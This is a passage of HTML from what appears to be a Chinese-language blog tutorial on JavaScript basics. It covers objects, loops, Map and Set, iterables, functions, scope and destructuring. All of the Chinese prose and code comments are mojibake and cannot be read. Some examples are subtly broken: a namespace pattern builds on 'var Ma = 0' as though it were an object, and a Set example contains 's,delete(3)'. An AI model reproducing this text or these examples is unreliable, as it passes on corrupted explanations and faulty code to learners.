class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xiao=&#123;</span><br><span class="line">name: <span class="string">'xiao'</span>,</span><br><span class="line">age: <span class="number">18</span>,</span><br><span class="line"><span class="string">'school'</span>: <span class="string">'No.1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(xiao.name)</span><br><span class="line"><span class="built_in">console</span>.log(xiao[<span class="string">'name'</span>])  <span class="comment">//ä¸¤ç§éƒ½å¯ä»¥è®¿é—®xiaoçš„nameå€¼</span></span><br><span class="line"><span class="built_in">console</span>.log(xiao[<span class="string">'school'</span>])</span><br></pre></td></tr></table></figure><p>ç”±äºJavaScriptçš„å¯¹è±¡æ˜¯åŠ¨æ€ç±»å‹ï¼Œä½ å¯ä»¥è‡ªç”±åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ æˆ–åˆ é™¤å±æ€§.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xiao=&#123;</span><br><span class="line">name: <span class="string">'xiao'</span>,</span><br><span class="line">&#125;</span><br><span class="line">xiao.age=<span class="number">18</span>;</span><br><span class="line">alert(xiao.age);</span><br><span class="line"><span class="keyword">delete</span> xiao.age</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯ä»¥ç”¨hasOwnProperty()æ–¹æ³•æ¥åˆ¤æ–­å±æ€§æ˜¯å¦æ˜¯è‡ªèº«æ‹¥æœ‰çš„</span></span><br><span class="line">xiao.hasOwnProperty(<span class="string">'name'</span>) <span class="comment">//true</span></span><br><span class="line">xiao.hasOwnProperty(<span class="string">'age'</span>) <span class="comment">//false</span></span><br></pre></td></tr></table></figure><h2 id="æ¡ä»¶åˆ¤æ–­"><a href="#æ¡ä»¶åˆ¤æ–­" class="headerlink" title="æ¡ä»¶åˆ¤æ–­"></a>æ¡ä»¶åˆ¤æ–­</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å•ä¸ªåˆ¤æ–­</span><br><span class="line">if(...)&#123;</span><br><span class="line">...</span><br><span class="line">&#125;else&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;å¤šè¡Œæ¡ä»¶åˆ¤æ–­</span><br><span class="line">if()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;else if()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JavaScriptæŠŠ<code>null</code>ã€<code>undefined</code>ã€<code>0</code>ã€<code>NaN</code>å’Œç©ºå­—ç¬¦ä¸²<code>&#39;&#39;</code>è§†ä¸º<code>false</code>ï¼Œå…¶ä»–å€¼ä¸€æ¦‚è§†ä¸º<code>true</code>.</p><h2 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(;;)&#123;</span><br><span class="line">...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>forå¾ªç¯æœ€å¸¸ç”¨çš„åœ°æ–¹å°±æ˜¯éå†æ•°ç»„</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br></pre></td></tr></table></figure><h3 id="for-in"><a href="#for-in" class="headerlink" title="for in"></a><strong>for in</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">name: <span class="string">'bob'</span>,</span><br><span class="line">age: <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> o)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(key);</span><br><span class="line">  <span class="built_in">console</span>.log(o[key]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//name age</span></span><br><span class="line"><span class="comment">//bob 18</span></span><br><span class="line"><span class="comment">//åŒæ ·ï¼Œæ•°ç»„ä¸­ä¹Ÿå¯ä»¥ç”¨for...in</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> a)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//A  B  C</span></span><br></pre></td></tr></table></figure><p><strong>while</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while(...)&#123;</span><br><span class="line">...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>doâ€¦while</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">do&#123;</span><br><span class="line">...</span><br><span class="line">&#125;while(...)</span><br></pre></td></tr></table></figure><h2 id="Mapå’ŒSet"><a href="#Mapå’ŒSet" class="headerlink" title="Mapå’ŒSet"></a>Mapå’ŒSet</h2><p>JavaScriptçš„é»˜è®¤å¯¹è±¡è¡¨ç¤ºæ–¹å¼<code>{}</code>å¯ä»¥è§†ä¸ºå…¶ä»–è¯­è¨€ä¸­çš„<code>Map</code>æˆ–<code>Dictionary</code>çš„æ•°æ®ç»“æ„ï¼Œå³ä¸€ç»„é”®å€¼å¯¹ã€‚</p><p>ä½†æ˜¯JavaScriptçš„å¯¹è±¡æœ‰ä¸ªå°é—®é¢˜ï¼Œå°±æ˜¯é”®å¿…é¡»æ˜¯å­—ç¬¦ä¸²ã€‚<strong>ä½†å®é™…ä¸ŠNumberæˆ–è€…å…¶ä»–æ•°æ®ç±»å‹ä½œä¸ºé”®ä¹Ÿæ˜¯éå¸¸åˆç†çš„ã€‚</strong></p><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a><strong>Map</strong></h3><p><code>Map</code>æ˜¯ä¸€ç»„é”®å€¼å¯¹çš„ç»“æ„ï¼Œå…·æœ‰æå¿«çš„æŸ¥æ‰¾é€Ÿåº¦ã€‚</p><p>åˆå§‹åŒ–<code>Map</code>éœ€è¦ä¸€ä¸ª<strong>äºŒç»´æ•°ç»„</strong>ï¼Œæˆ–è€…ç›´æ¥åˆå§‹åŒ–ä¸€ä¸ªç©º<code>Map</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Mapåˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="comment">//å¢</span></span><br><span class="line">m.set(<span class="string">'Bob'</span>,<span class="number">100</span>);</span><br><span class="line">m.set(<span class="string">'Pz1o'</span>,<span class="number">99</span>);</span><br><span class="line"><span class="comment">//åˆ </span></span><br><span class="line">m.delete(<span class="string">'Bob'</span>);</span><br><span class="line"><span class="comment">//æŸ¥</span></span><br><span class="line">m.has(<span class="string">'Pz1o'</span>); <span class="comment">//true</span></span><br><span class="line">m.get(<span class="string">'Pz1o'</span>); <span class="comment">//99</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šä¸€ä¸ªkeyåªèƒ½å¯¹åº”ä¸€ä¸ªvalueï¼Œé‡å¤å®šä¹‰åé¢çš„å€¼ä¼šè¦†ç›–æ‰å‰é¢çš„å€¼ã€‚</p><hr><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p><code>Set</code>å’Œ<code>Map</code>ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç»„keyçš„é›†åˆï¼Œä½†ä¸å­˜å‚¨valueã€‚ç”±äºkeyä¸èƒ½é‡å¤ï¼Œæ‰€ä»¥ï¼Œåœ¨<code>Set</code>ä¸­ï¼Œæ²¡æœ‰é‡å¤çš„keyã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//setåˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//é‡å¤å…ƒç´ ä¼šè¢«è‡ªåŠ¨è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//å¢</span></span><br><span class="line">s.add(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//åˆ </span></span><br><span class="line">s,<span class="keyword">delete</span>(<span class="number">3</span>);</span><br><span class="line"><span class="comment">//æŸ¥</span></span><br><span class="line">s;</span><br></pre></td></tr></table></figure><h2 id="iterable"><a href="#iterable" class="headerlink" title="iterable"></a>iterable</h2><p>éå†<code>Array</code>å¯ä»¥é‡‡ç”¨ä¸‹æ ‡å¾ªç¯ï¼Œéå†<code>Map</code>å’Œ<code>Set</code>å°±æ— æ³•ä½¿ç”¨ä¸‹æ ‡ã€‚ä¸ºäº†ç»Ÿä¸€é›†åˆç±»å‹ï¼ŒES6æ ‡å‡†å¼•å…¥äº†æ–°çš„<code>iterable</code>ç±»å‹ï¼Œ<code>Array</code>ã€<code>Map</code>å’Œ<code>Set</code>éƒ½å±äº<code>**iterable</code>ç±»å‹ã€‚**</p><p><strong>å…·æœ‰<code>iterable</code>ç±»å‹çš„é›†åˆå¯ä»¥é€šè¿‡æ–°çš„<code>for ... of</code>å¾ªç¯æ¥éå†ã€‚</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="string">'A'</span>,<span class="string">'a'</span>],[<span class="string">'Y'</span>,<span class="string">'y'</span>]]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> a)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> s)&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> m)&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//["A","a"]  ["Y","y"]</span></span><br></pre></td></tr></table></figure><blockquote><p><code>for...in</code>å’Œ<code>for...of</code>çš„ä¸åŒç‚¹ï¼š</p><p><code>for...in</code>ä¼šéå†å¯¹è±¡çš„æ‰€æœ‰å±æ€§åç§°ï¼Œä¸€ä¸ª<code>Array</code>æ•°ç»„å®é™…ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„æ¯ä¸ªå…ƒç´ çš„ç´¢å¼•è¢«è§†ä¸ºä¸€ä¸ªå±æ€§ã€‚</p><p><code>for...of</code>åˆ™ä¿®å¤äº†è¿™äº›é—®é¢˜ï¼Œå®ƒåªéå†å¾ªç¯é›†åˆçš„æœ¬èº«å…ƒç´ ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;forEachå‡½æ•°åŒæ ·å¯ä»¥ç”¨æ¥éå†</span><br><span class="line">var a &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;];</span><br><span class="line">a.forEach(function(value,index,a)&#123;</span><br><span class="line">console.log(value+&#39;,&#39;+index);</span><br><span class="line">&#125;);</span><br><span class="line">&#x2F;&#x2F;A,0  B,1  C,2</span><br><span class="line">forEach(å€¼,é”®,è‡ªèº«)</span><br></pre></td></tr></table></figure><h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><h2 id="å‡½æ•°å®šä¹‰å’Œè°ƒç”¨"><a href="#å‡½æ•°å®šä¹‰å’Œè°ƒç”¨" class="headerlink" title="å‡½æ•°å®šä¹‰å’Œè°ƒç”¨"></a>å‡½æ•°å®šä¹‰å’Œè°ƒç”¨</h2><p><strong>å®šä¹‰å‡½æ•°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params">...</span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//function æŒ‡æ˜æ˜¯å‡½æ•°çš„å®šä¹‰</span></span><br><span class="line"><span class="comment">//absæ˜¯å‡½æ•°åç§°</span></span><br><span class="line"><span class="comment">//(...)é‡Œé¢æ˜¯å‚æ•°</span></span><br><span class="line"><span class="comment">//&#123;...&#125;æ˜¯å‡½æ•°ä½“</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦ä¸€ç§å®šä¹‰æ–¹æ³•</span></span><br><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span>(<span class="params">..</span>)</span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//åœ¨è¿™ç§æ–¹å¼ä¸‹ï¼Œfunction(x)&#123; ... &#125;æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå®ƒæ²¡æœ‰å‡½æ•°åã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªåŒ¿åå‡½æ•°èµ‹å€¼ç»™äº†å˜é‡absï¼Œæ‰€ä»¥ï¼Œé€šè¿‡å˜é‡abså°±å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ã€‚</span></span><br></pre></td></tr></table></figure><p>è¯·æ³¨æ„ï¼Œå‡½æ•°ä½“å†…éƒ¨çš„è¯­å¥åœ¨æ‰§è¡Œæ—¶ï¼Œä¸€æ—¦æ‰§è¡Œåˆ°<code>return</code>æ—¶ï¼Œå‡½æ•°å°±æ‰§è¡Œå®Œæ¯•ï¼Œå¹¶å°†ç»“æœè¿”å›ã€‚å› æ­¤ï¼Œå‡½æ•°å†…éƒ¨é€šè¿‡æ¡ä»¶åˆ¤æ–­å’Œå¾ªç¯å¯ä»¥å®ç°éå¸¸å¤æ‚çš„é€»è¾‘ã€‚</p><p>å¦‚æœæ²¡æœ‰<code>return</code>è¯­å¥ï¼Œå‡½æ•°æ‰§è¡Œå®Œæ¯•åä¹Ÿä¼šè¿”å›ç»“æœï¼Œåªæ˜¯ç»“æœä¸º<code>undefined</code>ã€‚</p><hr><p><strong>è°ƒç”¨å‡½æ•°</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abs(10);</span><br><span class="line">abs(10,111);  &#x2F;&#x2F;è¿”å›10</span><br><span class="line">abs();     &#x2F;&#x2F;è¿”å›NaN</span><br></pre></td></tr></table></figure><p>ç”±äºJavaScriptå…è®¸ä¼ å…¥ä»»æ„ä¸ªå‚æ•°è€Œä¸å½±å“è°ƒç”¨ï¼Œå› æ­¤ä¼ å…¥çš„å‚æ•°æ¯”å®šä¹‰çš„å‚æ•°å¤šä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚</p><hr><p><strong>arguments</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//arguments(ä¼ªæ•°ç»„)</span></span><br><span class="line"><span class="comment">//å­˜å‚¨äº†ç”¨æˆ·çš„æ‰€æœ‰å®å‚</span></span><br><span class="line"><span class="comment">//ä¼ªæ•°ç»„ æœ‰lengthå±æ€§ æ˜¯æŒ‰ç…§ç´¢å¼•å­˜å‚¨çš„</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)  <span class="comment">//argumentsçš„æ•°ç»„å°±æ˜¯1 2 3</span></span><br></pre></td></tr></table></figure><p>å®é™…ä¸Š<code>arguments</code>æœ€å¸¸ç”¨äºåˆ¤æ–­ä¼ å…¥å‚æ•°çš„ä¸ªæ•°,ä»¥æ­¤æ¥åˆ¤æ–­ç¼ºå¤±å‚æ•°ã€‚</p><hr><p><strong>rest</strong></p><p>ç”±äºjsä¸­ä¼šæ¥å—æ¥å—å¤šä½™çš„å‚æ•°ï¼Œæ‰€ä»¥ç”¨ä¸€ä¸ªrestæ•°ç»„æ¥è¡¨ç¤ºå¤šä½™çš„å‚æ•°ã€‚restå‚æ•°åªèƒ½å†™åœ¨æœ€åï¼Œå‰é¢ç”¨<code>...</code>æ ‡è¯†ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">a,b,...rest</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(rest);</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);  <span class="comment">//[3]</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>)     <span class="comment">//[]</span></span><br></pre></td></tr></table></figure><h2 id="å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼"><a href="#å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼" class="headerlink" title="å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼"></a>å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼</h2><p>å¦‚æœä¸€ä¸ªå˜é‡åœ¨å‡½æ•°ä½“å†…éƒ¨ç”³æ˜ï¼Œåˆ™è¯¥å˜é‡çš„ä½œç”¨åŸŸä¸ºæ•´ä¸ªå‡½æ•°ä½“ï¼Œåœ¨å‡½æ•°ä½“å¤–ä¸å¯å¼•ç”¨è¯¥å˜é‡ã€‚</p><p>å¦‚æœä¸¤ä¸ªä¸åŒçš„å‡½æ•°å„è‡ªç”³æ˜äº†åŒä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¯¥å˜é‡åªåœ¨å„è‡ªçš„å‡½æ•°ä½“å†…èµ·ä½œç”¨ã€‚æ¢å¥è¯è¯´ï¼Œä¸åŒå‡½æ•°å†…éƒ¨çš„åŒåå˜é‡äº’ç›¸ç‹¬ç«‹ï¼Œäº’ä¸å½±å“ã€‚</p><hr><p><strong>å…¨å±€ä½œç”¨åŸŸ</strong></p><p>ä¸åœ¨ä»»ä½•å‡½æ•°å†…å®šä¹‰çš„å˜é‡å°±å…·æœ‰å…¨å±€ä½œç”¨åŸŸã€‚å®é™…ä¸Šï¼ŒJavaScripté»˜è®¤æœ‰ä¸€ä¸ªå…¨å±€å¯¹è±¡<code>window</code>ï¼Œå…¨å±€ä½œç”¨åŸŸçš„å˜é‡å®é™…ä¸Šè¢«ç»‘å®šåˆ°<code>window</code>çš„ä¸€ä¸ªå±æ€§ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'A'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.a);</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œå‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿä¼šç»‘å®šåˆ°<code>windows</code>å¯¹è±¡ã€‚ä»»ä½•å˜é‡ï¼ˆå‡½æ•°ä¹Ÿè§†ä¸ºå˜é‡ï¼‰ï¼Œå¦‚æœæ²¡æœ‰åœ¨å½“å‰å‡½æ•°ä½œç”¨åŸŸä¸­æ‰¾åˆ°ï¼Œå°±ä¼šç»§ç»­å¾€ä¸ŠæŸ¥æ‰¾ï¼Œæœ€åå¦‚æœåœ¨å…¨å±€ä½œç”¨åŸŸä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™æŠ¥<code>ReferenceError</code>é”™è¯¯ã€‚</p><hr><p><strong>åå­—ç©ºé—´</strong></p><p>å…¨å±€å˜é‡ä¼šç»‘å®šåˆ°<code>window</code>ä¸Šï¼Œä¸åŒçš„JavaScriptæ–‡ä»¶å¦‚æœä½¿ç”¨äº†ç›¸åŒçš„å…¨å±€å˜é‡ï¼Œæˆ–è€…å®šä¹‰äº†ç›¸åŒåå­—çš„é¡¶å±‚å‡½æ•°ï¼Œéƒ½ä¼šé€ æˆå‘½åå†²çªï¼Œå¹¶ä¸”å¾ˆéš¾è¢«å‘ç°ã€‚<strong>å‡å°‘å†²çªçš„ä¸€ä¸ªæ–¹æ³•æ˜¯æŠŠè‡ªå·±çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°å…¨éƒ¨ç»‘å®šåˆ°ä¸€ä¸ªå…¨å±€å˜é‡ä¸­ã€‚</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Ma = <span class="number">0</span>;</span><br><span class="line">Ma.name = <span class="string">"xiaoming"</span>;</span><br><span class="line">Ma.fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>å±€éƒ¨ä½œç”¨åŸŸ</strong></p><p>ä¸ºäº†è§£å†³å—çº§ä½œç”¨åŸŸï¼ŒES6å¼•å…¥äº†æ–°çš„å…³é”®å­—<code>let</code>ï¼Œç”¨<code>let</code>æ›¿ä»£<code>var</code>å¯ä»¥ç”³æ˜ä¸€ä¸ªå—çº§ä½œç”¨åŸŸçš„å˜é‡ã€‚</p><p><strong>å¸¸é‡</strong></p><p>ES6æ ‡å‡†å¼•å…¥äº†æ–°çš„å…³é”®å­—<code>const</code>æ¥å®šä¹‰å¸¸é‡ï¼Œ<code>const</code>ä¸<code>let</code>éƒ½å…·æœ‰å—çº§ä½œç”¨åŸŸã€‚</p><p><strong>è§£æ„èµ‹å€¼</strong></p><p>è§£æ„èµ‹å€¼å°±æ˜¯åŒæ—¶å¯¹ä¸€ç»„å˜é‡è¿›è¡Œèµ‹å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> [x, y, z] = [<span class="string">'hello'</span>, <span class="string">'JavaScript'</span>, <span class="string">'ES6'</span>];</span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦ä»ä¸€ä¸ªå¯¹è±¡ä¸­å–å‡ºè‹¥å¹²å±æ€§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è§£æ„èµ‹å€¼ï¼Œä¾¿äºå¿«é€Ÿè·å–å¯¹è±¡çš„æŒ‡å®šå±æ€§ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name : <span class="string">'xiaoming'</span>,</span><br><span class="line">age : <span class="number">18</span>,</span><br><span class="line">university : &#123;</span><br><span class="line">specialities : <span class="string">'cs'</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//ç›´æ¥èµ‹å€¼</span></span><br><span class="line"><span class="keyword">var</span> &#123;name,age&#125; = person;</span><br><span class="line"><span class="comment">//åµŒå¥—å¯¹è±¡çš„èµ‹å€¼</span></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">university</span> : &#123;specialities&#125;&#125; = person;</span><br><span class="line"><span class="comment">//å¦‚æœæƒ³è¦çš„å˜é‡å’Œå¯¹è±¡çš„å±æ€§åä¸ä¸€æ ·ï¼Œå¯ä»¥å¦‚ä¸‹æ“ä½œ</span></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">name</span>:mz&#125; = person;</span><br></pre></td></tr></table></figure><blockquote><p>ä½¿ç”¨åœºæ™¯ï¼šè§£æ„èµ‹å€¼åœ¨å¾ˆå¤šæ—¶å€™å¯ä»¥å¤§å¤§ç®€åŒ–ä»£ç ã€‚ä¾‹å¦‚ï¼Œäº¤æ¢ä¸¤ä¸ªå˜é‡<code>x</code>å’Œ<code>y</code>çš„å€¼ï¼Œå¯ä»¥è¿™ä¹ˆå†™ï¼Œä¸å†éœ€è¦ä¸´æ—¶å˜é‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var x &#x3D; 1,y &#x3D; 2;</span><br><span class="line">[x , y] &#x3D; [y ,x];</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€ä¸ªå‡½æ•°æ¥æ”¶ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆï¼Œå¯ä»¥ä½¿ç”¨è§£æ„ç›´æ¥æŠŠå¯¹è±¡çš„å±æ€§ç»‘å®šåˆ°å˜é‡ä¸­ã€‚</p></blockquote><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" 